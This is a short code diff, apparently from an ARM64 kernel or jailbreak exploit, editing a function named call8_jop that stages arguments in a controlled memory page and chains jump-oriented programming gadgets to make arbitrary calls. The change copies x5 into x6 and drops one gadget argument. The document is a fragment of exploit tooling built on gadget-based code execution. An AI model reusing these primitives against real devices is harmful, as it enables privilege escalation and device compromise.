@@ -223,9 +223,10 @@ uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_
     write64(my_page + 0x8A8, x2);
     write64(my_page + 0x8B0, x3);
     write64(my_page + 0x8B8, x4);
+    x6 = x5;
 
     uint64_t STORED_RET = my_page + 0x100;
-    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, mov_x15_x2__br_x3, x5, x6);
+    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, 0, x5, x6);
 
     uint64_t ret = read64(STORED_RET);
 
